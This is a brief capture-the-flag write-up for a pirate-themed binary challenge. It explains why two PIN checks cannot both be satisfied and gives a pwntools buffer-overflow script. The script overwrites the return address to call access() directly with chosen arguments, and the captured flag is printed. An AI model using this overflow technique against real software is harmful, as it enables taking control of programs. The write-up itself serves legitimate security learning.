# Proof of Concept

## TL;DR

- its impossible to satisfy both the if statements in both `menu()` and `access()`, since pin must be `123` and `1234` at the same time to satisfy both conditions. So, need to directly call `access()` and give it the correct parameters

```
def exploit():
    global io
    rop = ROP(exe)
    io = initialize()

    io.sendlineafter(b':', cyclic(27) + p32(0x080491e6) + p32(0) + p32(1234))
    io.sendlineafter(b':', b'123') # this is irrelevant and can be filled with anything

    io.interactive()
```

```
hand over yer PIN:
Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
Here be yer treasure, matey:
HCS{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye}
